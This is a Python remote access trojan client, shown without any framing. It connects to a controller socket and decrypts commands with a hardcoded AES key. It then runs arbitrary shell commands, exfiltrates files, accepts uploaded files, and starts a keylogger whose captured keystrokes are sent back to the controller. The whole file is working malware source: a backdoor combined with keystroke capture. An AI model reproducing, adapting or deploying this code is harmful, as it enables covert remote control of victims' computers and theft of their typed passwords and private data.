#!/bin/python3
import socket
import threading
import subprocess
from pathlib import Path
from pynput import *
from base64 import *
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

allkeys = ''

def pressed(key):
 	global allkeys
 	allkeys += str(key)

def released(lol):
 	pass

def keylog():
 	l = keyboard.Listener(on_press=pressed, on_release=released)
 	l.start()

def cbc_decrypt(cipher, key, iv):
    decrypted = AES.new(key, AES.MODE_CBC, iv=iv)
    padded_plaintxt = decrypted.decrypt(cipher)
    plaintxt = unpad(padded_plaintxt, AES.block_size, style='pkcs7')
    return plaintxt.decode()


key = b'YELLOW SUBMARINE'
iv = b'\x00' * 16


def download_file(filename):
	print("The Path" , Path(filename))
	f = open(Path(filename), 'rb')
	contents = f.read()
	f.close()
	print("sending content", contents)
	cs.send(contents)
	print("sent", contents)
	msg = cs.recv(1024)
	print("Inside download",msg)
	decrypt = cbc_decrypt(msg,key,iv)
	print(decrypt)
	return(decrypt)


def upload_file(filename,filesize):
	f = open(Path(filename), 'wb')
	contents = cs.recv(filesize)
	f.write(contents)
	f.close()
	cs.send('got file'.encode())
	msg = cs.recv(2048)
	print("Inside Upload",msg)
	decrypt = cbc_decrypt(msg,key,iv)
	print(decrypt)
	return(decrypt)
	

def execute_cmd(msg):
	print("In Execute cmd",msg)
	p = subprocess.Popen(msg, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
	output,error = p.communicate()
	if (len(output) > 0):
		msg = str(output.decode())
	else:
		msg = str(error.decode())
	print(msg)
	cs.send(msg.encode())
	msg = cs.recv(1024)
	decrypt = cbc_decrypt(msg,key,iv)
	print(decrypt)
	return(decrypt)


ip = '127.0.0.1'
port = 1234

cs = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
cs.connect((ip,port))

msg = 'TEST CLIENT'

cs.send(msg.encode())
msg = cs.recv(1024)
decrypt = cbc_decrypt(msg,key,iv)
print(decrypt)
print("Outside Loop " ,msg)
while True:
	
	fullmsg = decrypt
	print("Inside Loop ",fullmsg)
	msg = list(decrypt.split(" "))
	if msg[0] == 'download':
		filename = msg[1]
		decrypt = download_file(filename)
		print("recieved from fucn : ",decrypt)

	elif msg[0] == 'upload':
		filename = msg[1]
		print(filename)
		filesize = int(msg[2])
		print(filesize)
		decrypt = upload_file(filename,filesize)

	elif fullmsg == 'keylog on':
	 	msg = 'keylogging has started'
	 	t1 = threading.Thread(target=keylog)
	 	t1.start()
	 	print(msg)
	 	cs.send(msg.encode())
	 	msg = cs.recv(1024)
	 	decrypt = cbc_decrypt(msg,key,iv)	 	

	elif fullmsg == 'keylog off':
		t1.join()
		msg = allkeys.encode()
		print(msg)
		cs.send(msg)
		msg = cs.recv(1024)
		decrypt = cbc_decrypt(msg,key,iv)	 	
	else:
		# msg = cbc_decrypt(msg,KEY)
		print("Decrypted",msg)
		decrypt = execute_cmd(' '.join(msg))
	print("After else",decrypt)
	
	# 
